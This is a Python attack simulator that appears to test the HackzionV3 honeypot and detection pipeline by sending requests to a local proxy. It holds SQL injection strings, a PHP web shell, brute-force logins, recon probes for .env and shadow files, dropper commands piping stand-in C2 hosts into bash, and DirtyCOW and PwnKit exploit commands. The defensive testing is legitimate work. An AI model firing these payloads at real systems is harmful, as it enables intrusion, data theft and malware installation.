#!/usr/bin/env python3
# simulator/simulate_attack.py
"""
HackzionV3 Attack Simulator
Sends real HTTP requests through the proxy to exercise the full pipeline.

Usage:
    python simulate_attack.py --type sql
    python simulate_attack.py --type brute
    python simulate_attack.py --type recon
    python simulate_attack.py --type advanced
    python simulate_attack.py --type malware
    python simulate_attack.py --type kernel
    python simulate_attack.py --type all
    python simulate_attack.py --type all --host http://localhost --delay 0.2
"""

import argparse
import time
import sys
import json
import random
import requests
from dataclasses import dataclass
from typing import Callable

# ── ANSI colours ──────────────────────────────────────────────────────────────
R  = "\033[91m"   # Red
Y  = "\033[93m"   # Yellow
G  = "\033[92m"   # Green
C  = "\033[96m"   # Cyan
W  = "\033[97m"   # White
DIM= "\033[2m"
RST= "\033[0m"
BOLD="\033[1m"

BANNER = f"""
{R}{BOLD}
  _  _         _     _____            _  _ _
 | || |__ _ __| |__ |_  (_)___ _ _   | || / /
 | __ / _` / _| / /  / /| / _ \\ ' \\ \\  V /
 |_||_\\__,_\\__|_\\_\\  /___|_\\___/_||_| \\_/
{RST}{C}  HackzionV3 — Attack Simulator v3.0{RST}
{DIM}  For testing honeypot + detection + response pipeline{RST}
"""


@dataclass
class SimResult:
    scenario:   str
    requests:   int
    trapped:    int
    decision:   str
    score:      str


def _req(
    session: requests.Session,
    host: str,
    path: str = "/",
    method: str = "GET",
    params: dict = None,
    data: dict = None,
    headers: dict = None,
    label: str = "",
    delay: float = 0.15,
) -> requests.Response | None:
    url = f"{host}{path}"
    try:
        r = session.request(
            method,
            url,
            params=params,
            json=data,
            headers=headers or {},
            timeout=5,
            allow_redirects=True,
        )
        decision = r.headers.get("X-Route-Decision", "?")
        score    = r.headers.get("X-Risk-Score", "?")
        backend  = "HONEYPOT" if decision == "honeypot" else "REAL"
        colour   = R if decision == "honeypot" else G
        print(
            f"  {colour}[{backend}]{RST} {DIM}{method:6}{RST} "
            f"{C}{path[:55]:<55}{RST}  "
            f"score={Y}{score}{RST}  "
            f"{'  ← '+label if label else ''}"
        )
        time.sleep(delay)
        return r
    except requests.exceptions.ConnectionError:
        print(f"  {R}[ERR]{RST} Cannot connect to {host} — is the proxy running?")
        sys.exit(1)
    except Exception as e:
        print(f"  {R}[ERR]{RST} {e}")
        return None


# ── Attack scenarios ──────────────────────────────────────────────────────────

def simulate_brute_force(host: str, delay: float) -> SimResult:
    print(f"\n{Y}{BOLD}▶ BRUTE FORCE SIMULATION{RST}")
    print(f"{DIM}  Scenario: Rapid login attempts to escalate rate score{RST}\n")
    s = requests.Session()
    trapped = 0
    for i in range(18):
        creds = {"username": random.choice(["admin","root","user","test"]),
                 "password": f"pass{i}"}
        r = _req(s, host, "/login", "POST", data=creds,
                 label=f"attempt {i+1}", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot":
            trapped += 1
    final = _req(s, host, "/admin", label="post-brute admin probe", delay=delay)
    decision = final.headers.get("X-Route-Decision","?") if final else "?"
    score    = final.headers.get("X-Risk-Score","?") if final else "?"
    return SimResult("brute_force", 19, trapped, decision, score)


def simulate_sql_injection(host: str, delay: float) -> SimResult:
    print(f"\n{Y}{BOLD}▶ SQL INJECTION SIMULATION{RST}")
    print(f"{DIM}  Scenario: Classic SQLi probes via query params{RST}\n")
    s = requests.Session()
    payloads = [
        ("/search", {"q": "' OR '1'='1"}),
        ("/search", {"q": "' UNION SELECT username,password FROM users--"}),
        ("/login",  {"q": "admin'--"}),
        ("/items",  {"id": "1 AND 1=1"}),
        ("/items",  {"id": "1; DROP TABLE users--"}),
        ("/api/v1/users", {"filter": "' OR 1=1#"}),
    ]
    trapped = 0
    for path, params in payloads:
        r = _req(s, host, path, params=params,
                 label="SQLi payload", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot":
            trapped += 1
    final = _req(s, host, "/search", params={"q": "'; EXEC xp_cmdshell('whoami')--"},
                 label="advanced SQLi", delay=delay)
    decision = final.headers.get("X-Route-Decision","?") if final else "?"
    score    = final.headers.get("X-Risk-Score","?") if final else "?"
    return SimResult("sql_injection", len(payloads)+1, trapped, decision, score)


def simulate_recon(host: str, delay: float) -> SimResult:
    print(f"\n{Y}{BOLD}▶ RECONNAISSANCE SIMULATION{RST}")
    print(f"{DIM}  Scenario: Path scanning, env/config discovery{RST}\n")
    s = requests.Session()
    paths = [
        "/", "/.env", "/config", "/admin", "/wp-admin",
        "/robots.txt", "/sitemap.xml", "/.git/config",
        "/backup.zip", "/db.sql", "/phpinfo.php",
        "/server-status", "/.htaccess", "/web.config",
        "/api/v1/", "/api/swagger.json", "/actuator/health",
    ]
    trapped = 0
    for path in paths:
        r = _req(s, host, path, label="recon probe", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot":
            trapped += 1
    final = _req(s, host, "/.env", label="env file grab", delay=delay)
    decision = final.headers.get("X-Route-Decision","?") if final else "?"
    score    = final.headers.get("X-Risk-Score","?") if final else "?"
    return SimResult("recon", len(paths), trapped, decision, score)


def simulate_advanced(host: str, delay: float) -> SimResult:
    print(f"\n{Y}{BOLD}▶ ADVANCED MULTI-STAGE SIMULATION{RST}")
    print(f"{DIM}  Scenario: Full kill-chain — recon → exploit → exfil{RST}\n")
    s = requests.Session()
    trapped = 0

    # Stage 1: Recon
    print(f"  {C}[Stage 1] Reconnaissance{RST}")
    for path in ["/", "/robots.txt", "/admin", "/.env"]:
        r = _req(s, host, path, label="recon", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot": trapped += 1

    # Stage 2: Exploitation
    print(f"\n  {C}[Stage 2] Exploitation{RST}")
    exploits = [
        ("/login",  {"q": "' OR '1'='1"}),
        ("/cmd",    {"exec": "whoami"}),
        ("/upload", {"shell": "<?php system($_GET['cmd']); ?>"}),
        ("/admin/db", {}),
    ]
    for path, params in exploits:
        r = _req(s, host, path, "POST", params=params, label="exploit", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot": trapped += 1

    # Stage 3: Exfiltration
    print(f"\n  {C}[Stage 3] Exfiltration{RST}")
    exfil_paths = [
        ("/admin/users", {}),
        ("/etc/passwd",  {}),
        ("/admin/db",    {}),
        ("/backup/db.sql", {}),
    ]
    for path, params in exfil_paths:
        r = _req(s, host, path, params=params, label="exfil", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot": trapped += 1

    total = 4 + len(exploits) + len(exfil_paths)
    final = _req(s, host, "/admin/db", label="final exfil", delay=delay)
    decision = final.headers.get("X-Route-Decision","?") if final else "?"
    score    = final.headers.get("X-Risk-Score","?") if final else "?"
    return SimResult("advanced_multi_stage", total, trapped, decision, score)


def simulate_malware(host: str, delay: float) -> SimResult:
    """
    Simulates malware deployment patterns:
    wget/curl to pull payloads, chmod, execution.
    The honeypot returns convincing fake wget output and logs the C2 URL.
    Nothing is ever executed.
    """
    print(f"\n{Y}{BOLD}▶ MALWARE DEPLOYMENT SIMULATION{RST}")
    print(f"{DIM}  Scenario: C2 dropper — wget payload, chmod +x, execute{RST}\n")
    s = requests.Session()
    trapped = 0

    malware_commands = [
        ("/cmd", {"cmd": "wget http://malicious-c2.example.com/miner.sh"}),
        ("/cmd", {"cmd": "chmod +x miner.sh"}),
        ("/cmd", {"cmd": "./miner.sh"}),
        ("/cmd", {"cmd": "curl -s http://malicious-c2.example.com/payload | bash"}),
        ("/cmd", {"cmd": "crontab -e"}),
        ("/upload", {"file": "miner.sh", "content": "#!/bin/bash\ncurl http://c2/beacon"}),
        ("/cmd", {"cmd": "wget http://another-c2.example.com/rootkit.tar.gz"}),
        ("/cmd", {"cmd": "tar -xzf rootkit.tar.gz && ./install.sh"}),
    ]
    for path, params in malware_commands:
        r = _req(s, host, path, "POST", data=params, label="malware dropper", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot": trapped += 1

    final = _req(s, host, "/cmd", params={"cmd": "ps aux"}, label="verify install", delay=delay)
    decision = final.headers.get("X-Route-Decision","?") if final else "?"
    score    = final.headers.get("X-Risk-Score","?") if final else "?"
    return SimResult("malware_deployment", len(malware_commands)+1, trapped, decision, score)


def simulate_kernel_exploit(host: str, delay: float) -> SimResult:
    """
    Simulates kernel exploit / privilege escalation attempts.
    Honeypot fakes a partial success (segfault) to keep attacker engaged
    while logging all CVE strings and exploit binaries attempted.
    Nothing executes on the real system.
    """
    print(f"\n{Y}{BOLD}▶ KERNEL EXPLOIT / PRIVILEGE ESCALATION SIMULATION{RST}")
    print(f"{DIM}  Scenario: CVE probes — DirtyCOW, PwnKit, overlayfs{RST}\n")
    s = requests.Session()
    trapped = 0

    exploit_attempts = [
        ("/cmd", {"cmd": "uname -a"}),
        ("/cmd", {"cmd": "cat /proc/version"}),
        ("/cmd", {"cmd": "wget https://github.com/dirtycow/dirtycow.github.io/raw/master/dirtyc0w.c"}),
        ("/cmd", {"cmd": "gcc -pthread dirtyc0w.c -o dirtycow -lcrypt"}),
        ("/cmd", {"cmd": "./dirtycow /etc/passwd CVE-2016-5195"}),
        ("/cmd", {"cmd": "python3 CVE-2021-4034.py"}),          # PwnKit
        ("/cmd", {"cmd": "./pwnkit pkexec"}),
        ("/cmd", {"cmd": "ls -la /proc/self/exe"}),
        ("/cmd", {"cmd": "cat /sys/kernel/security/apparmor/profiles"}),
        ("/cmd", {"cmd": "overlayfs_exploit CVE-2023-0386"}),
        ("/cmd", {"cmd": "id && whoami"}),
        ("/cmd", {"cmd": "cat /etc/shadow"}),
    ]
    for path, params in exploit_attempts:
        r = _req(s, host, path, "POST", data=params, label="kernel exploit", delay=delay)
        if r and r.headers.get("X-Route-Decision") == "honeypot": trapped += 1

    final = _req(s, host, "/cmd", params={"cmd": "id"}, label="post-exploit verify", delay=delay)
    decision = final.headers.get("X-Route-Decision","?") if final else "?"
    score    = final.headers.get("X-Risk-Score","?") if final else "?"
    return SimResult("kernel_exploit", len(exploit_attempts)+1, trapped, decision, score)


# ── Result printer ────────────────────────────────────────────────────────────

def print_result(r: SimResult):
    colour = R if r.decision == "honeypot" else G
    print(f"\n{BOLD}{'─'*60}{RST}")
    print(f"  {BOLD}Scenario  :{RST}  {C}{r.scenario}{RST}")
    print(f"  {BOLD}Requests  :{RST}  {r.requests}")
    print(f"  {BOLD}Trapped   :{RST}  {Y}{r.trapped}{RST}")
    print(f"  {BOLD}Final dec :{RST}  {colour}{r.decision.upper()}{RST}")
    print(f"  {BOLD}Risk score:{RST}  {Y}{r.score}{RST}")
    print(f"{BOLD}{'─'*60}{RST}\n")


def check_pipeline(host: str):
    """Quick pipeline validation — calls all API endpoints."""
    print(f"\n{C}{BOLD}▶ PIPELINE VALIDATION{RST}")
    endpoints = [
        f"{host.replace('80','8003')}/api/attacks/live",
        f"{host.replace('80','8003')}/api/alerts",
        f"{host.replace('80','8003')}/api/stats",
    ]
    # Try via Nginx proxy on port 80 first (proxy routes /api/* to api service)
    proxy_endpoints = [
        f"{host}/api/attacks/live",
        f"{host}/api/alerts",
        f"{host}/api/stats",
    ]
    for url in proxy_endpoints:
        try:
            r = requests.get(url, timeout=3)
            size = len(r.content)
            print(f"  {G}[{r.status_code}]{RST} {C}{url}{RST}  ({size} bytes)")
        except Exception as e:
            print(f"  {R}[ERR]{RST} {url} — {e}")


# ── CLI ───────────────────────────────────────────────────────────────────────

SCENARIOS: dict[str, Callable] = {
    "brute":   simulate_brute_force,
    "sql":     simulate_sql_injection,
    "recon":   simulate_recon,
    "advanced":simulate_advanced,
    "malware": simulate_malware,
    "kernel":  simulate_kernel_exploit,
}


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="HackzionV3 Attack Simulator")
    parser.add_argument("--type",  default="recon",
                        choices=list(SCENARIOS.keys()) + ["all"],
                        help="Attack type to simulate")
    parser.add_argument("--host",  default="http://localhost",
                        help="Target proxy host (default: http://localhost)")
    parser.add_argument("--delay", type=float, default=0.15,
                        help="Delay between requests in seconds (default: 0.15)")
    parser.add_argument("--validate", action="store_true",
                        help="Run pipeline validation after simulation")
    args = parser.parse_args()

    if args.type == "all":
        results = []
        for name, fn in SCENARIOS.items():
            results.append(fn(args.host, args.delay))
            print_result(results[-1])
            time.sleep(1)
        print(f"\n{BOLD}{G}All scenarios complete.{RST}")
    else:
        result = SCENARIOS[args.type](args.host, args.delay)
        print_result(result)

    if args.validate:
        check_pipeline(args.host)


if __name__ == "__main__":
    main()